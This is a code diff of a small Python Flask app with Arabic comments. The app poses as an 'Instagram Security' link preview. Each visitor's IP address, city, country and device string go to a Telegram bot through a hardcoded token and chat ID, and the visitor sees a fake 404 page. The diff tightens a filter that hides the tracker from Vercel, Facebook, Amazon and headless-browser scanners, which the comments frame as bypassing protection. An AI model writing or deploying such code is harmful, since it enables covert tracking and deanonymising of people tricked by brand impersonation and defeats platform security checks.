@@ -3,7 +3,7 @@ import requests
 
 app = Flask(__name__)
 
-# إعداداتك الأصلية 100% كما في الصور
+# تأكد من التوكن والآيدي جيداً
 TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
 CHAT_ID = "8524242091" 
 
@@ -11,6 +11,7 @@ def send_to_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
     try:
+        # استخدام json=payload يضمن وصول الرسالة عبر Vercel 100%
         requests.post(url, json=payload, timeout=10)
     except:
         pass
@@ -22,42 +23,33 @@ def track():
     ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    # --- تطوير لتجاوز بوتات الحماية اللي في صورتك ---
+    # 1. فلترة البوتات المزعجة (تجاوز الحماية)
     ua_lower = user_agent.lower()
-    # إذا كان الزائر هو "vercel-screenshot" أو "HeadlessChrome" (بوتات الفحص)
-    if 'vercel-screenshot' in ua_lower or 'headlesschrome' in ua_lower or 'facebookexternalhit' in ua_lower:
-        # لا نرسل رسالة للبوت لكي لا يمتلئ البوت برسائل وهمية
-        return "404 Not Found", 404
+    if any(bot in ua_lower for bot in ['amazon', 'vercel', 'facebook', 'headlesschrome']):
+        return "Not Found", 404
 
+    # 2. جلب الموقع مع حماية الكود من التوقف
     try:
         geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
-        location = f"{geo_res.get('city', 'Unknown')}, {geo_res.get('country', 'Unknown')}"
-        isp = geo_res.get('isp', 'Unknown')
+        location = f"{geo_res.get('city')}, {geo_res.get('country')}"
     except:
-        location = isp = "Error Fetching Data"
+        location = "Unknown"
 
+    # 3. إرسال التقرير
     report = (
-        f"🎯 <b>صيد حقيقي (بدون ضغط)!</b>\n"
-        f"--------------------------\n"
+        f"🎯 <b>صيد صامت جديد!</b>\n"
         f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
         f"📍 <b>الموقع:</b> {location}\n"
-        f"🏢 <b>المزود:</b> {isp}\n"
-        f"📱 <b>الجهاز:</b> {user_agent}\n"
-        f"--------------------------"
+        f"📱 <b>الجهاز:</b> {user_agent[:50]}..."
     )
     send_to_telegram(report)
     
     return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta property="og:title" content="Instagram Security">
-        <meta property="og:description" content="Confirm your identity to continue.">
-        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
-        <meta property="og:type" content="video.other">
-    </head>
-    <body><h1>404 Not Found</h1></body>
-    </html>
+    <html><head>
+    <meta property="og:title" content="Instagram Security">
+    <meta property="og:type" content="video.other">
+    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
+    </head><body><h1>404 Not Found</h1></body></html>
     """, 200
 
 if __name__ == '__main__':
